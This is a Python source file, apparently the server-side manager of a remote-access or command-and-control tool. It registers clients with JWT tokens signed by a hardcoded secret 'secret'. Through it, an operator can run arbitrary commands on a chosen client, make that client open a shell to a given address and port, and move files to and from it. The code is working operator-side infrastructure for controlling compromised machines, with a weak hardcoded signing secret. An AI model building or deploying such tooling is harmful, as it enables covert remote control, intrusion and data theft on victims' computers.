from flask import request, send_file, send_from_directory, safe_join, abort
import uuid
import time
import jwt
import os.path
import base64
import collections
from threading import Thread
from myclient import client

import hashlib

MAX_LEN_JOB=10
JWT_SECRET="secret"

def encodeJwt(token):
    return jwt.encode(token,JWT_SECRET,'HS256')

def decodeJwt(token):
    try:
        result=jwt.decode(token,JWT_SECRET,'HS256')
        return result,True
    except jwt.exceptions.PyJWTError:
        return None,False

class manager:
    def __init__(self,passwd):
        self.clientList=collections.OrderedDict()
        self.result = ""
        self.ok = False
        self.password = self.password= hashlib.sha512( str(passwd).encode("utf-8") ).hexdigest()

    def getClients(self):
        return self.clientList
    
    def passwordCorrect(self,hash):
        if (hash == self.password):
            return True
        else:
            return False

    def register(self,ip=""):
        new_uid=uuid.uuid4().hex
        c=client(new_uid,ip)
        self.clientList[new_uid]=c
        print("registrado",self.clientList)
        return encodeJwt({"uid":new_uid}),True

    def getCmd(self,uid):
        return self.clientList[uid].getCmd()

    ########################## actions RPC ############################
    def getClientByIndex(self,clientUid):
        try:
            return list(self.clientList.items())[clientUid][1]
        except:
            return None
            
    def displayClients(self):
        r ="displaying clients: \n"

        for i in range(len(self.clientList.items())):
            r+="cliente %i  = %s \n"%(i,self.getClientByIndex(i))
        
        return r

    def abrirShell(self,clientuid,addr,port):
        
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).openShell(addr,port)
            return self.resulter()
        else:
            print("client don't find")

    def runCommand(self,cmd,clientuid=0):
        cmdList=[cmd]
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).runCommand(cmdList)
            return self.resulter()
        else:
            return "client don't find"
    
    def testClient(self,clientuid=0):
        if (self.getClientByIndex(clientuid)):
            return self.getClientByIndex(clientuid).clientOK()
        else:
            return "client don't find"
    
    def fileServer2Client(self,clientuid,csFile):
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).fileServer2Client(csFile)
            return self.resulter()
        else:
            return "client don't find"
    
    def fileClient2Server(self,clientuid,scFile):
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).fileClient2Server(scFile)
            return self.resulter()
        else:
            return "client don't find"
    
    def report(self,input):
        self.ok=True
        self.result = input

    def resulter(self):
      time.sleep(1) #trocar pra 5
      if self.ok==True:
          self.ok=False
          return self.result
      else:
          self.result = ""
          return ""

        


















